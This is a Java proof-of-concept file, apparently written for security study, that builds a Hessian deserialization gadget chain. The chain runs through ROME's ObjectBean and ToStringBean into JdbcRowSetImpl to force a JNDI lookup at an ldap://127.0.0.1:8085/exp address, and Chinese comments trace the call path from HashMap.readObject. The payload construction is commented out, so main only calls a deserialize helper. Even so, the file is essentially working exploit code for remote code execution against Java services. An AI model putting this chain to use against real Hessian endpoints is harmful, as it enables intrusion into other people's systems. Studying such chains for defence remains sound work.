import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import util.Util.*;
import java.util.HashMap;

import static util.Util.*;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/10
 */
/*
* 写在前面，ToStringBean类的toString方法会遍历获取prefix中的每个字段，通过反射调用其对应的get方法
* 所以这里可以直接使用JdbcRowSetImpl来打jndi，当然直接使用ROME原生也是可以的
*
* */
/*
* 调用链:
*   HashMap.readObject()
 *   ObjectBean.hashCode()
 *       EqualsBean.beanHashCode()
 *           ToStringBean.toString()
 *              JdbcRowSetImpl.getDatabaseMetaData()
*
* */
    /*
    * 调用链其实是一样的，主要还是看Hessian在处理反序列化的时候跟ObjectInputStream有什么不同
    *
    * */
public class Hessian_ROME {
    public static void main(String[] args) throws Exception{
//        String ldap = "ldap://127.0.0.1:8085/exp";
//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        jdbcRowSet.setDataSourceName(ldap);
//        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
//        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
//        HashMap<Object, Object> hashMap = makeMap(objectBean,"dragonkeep");
//        serializeHessian(hashMap);
        unserializeHessian();
    }
}
